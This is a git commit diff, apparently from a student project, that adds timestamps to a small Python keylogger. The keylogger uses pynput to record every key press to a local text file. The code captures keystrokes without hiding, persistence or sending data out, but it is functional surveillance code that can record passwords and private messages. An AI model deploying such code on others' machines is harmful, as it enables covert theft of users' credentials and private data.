9690a7e37d61e7f4a5416e113bb4e9972e5a580a
Sujan <079bct086@ioepc.edu.np>
2024-01-25 14:29:16 +0545

    time addition

--- main.py
+++ main.py
@@ -1,14 +1,17 @@
 from pynput import keyboard
+from datetime import datetime
 
 def keyPressed(key):
-    print(str(key))
-    with open("keyfile.txt", 'a') as logKey:#opens if there is existing file otherwise make it
+    try:
+        char = key.char
+    except AttributeError:
+        char = f'[{key}]'  # handles special keys
+    
+    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")# extracting the time in the properformat
+    log_entry = f"{time} - {char}\n" #saving the key pressed and the time to a variable
 
-        try:
-            char = key.char
-            logKey.write(char)#writting the pressed key the keyfile.txt
-        except:
-            print("Error getting char")#incase  inreognizable key is pressed
+    with open("keyfile.txt", 'a') as log_key:
+        log_key.write(log_entry)#write the time and key pressed to the file
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
